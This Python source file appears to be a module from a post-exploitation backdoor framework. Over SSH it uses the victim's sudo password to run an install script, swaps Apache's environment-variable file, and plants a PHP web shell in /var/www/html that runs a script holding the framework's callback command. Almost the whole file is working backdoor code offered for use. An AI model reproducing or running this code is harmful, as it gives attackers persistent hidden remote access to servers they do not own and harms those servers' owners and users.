from module import *
import time

class WebMod(Module):

    def __init__(self, target, backdoor, core):
        self.core = core
        self.target = target
        self.name = "Web"
        self.backdoor = backdoor
        self.options = {
            "location" : Option("name", "newback.php", "location of file", False)
        }
    
    
    def exploit(self):
        location = self.get_value("location")
        
        self.target.scpFiles(self, "modules/web/install.sh", False)
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S bash install.sh")

        print("Starting Apache server.")
        print("This will take 10 seconds. If it takes longer, the script will proceed, but this will not work. In that case, run the exploit again once you know the server is up (it will call back to you as www-data)")
        time.sleep(10)
        toW = 'modules/web/envvars'
        stringToAdd=""
        fileToWrite=open(toW, 'w')
        
        with open ("modules/web/env1", "r") as myfile:
            data = myfile.read()
        data = data[:-1]
        stringToAdd += data+self.target.uname
        with open ("modules/web/env2", "r") as myfile:
            data = myfile.read()
        stringToAdd+=data

        fileToWrite.write(stringToAdd)       
        fileToWrite.close()

        self.target.scpFiles(self, 'modules/web/envvars')
        print("Moving Apache environment variables")
        
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S rm /etc/apache2/envvars")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S mv envvars /etc/apache2")
        
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S service apache2 restart")
        


        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \'<?php\nexec(\"bash ajdoiwekd.sh\");\n?> \' > " + location)
        
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S mv " + location + " /var/www/html")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \"" + self.backdoor.get_command() + "\" > ajdoiwekd.sh")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S cp ajdoiwekd.sh /var/www/html")

        print(GOOD + self.name + " module success") 
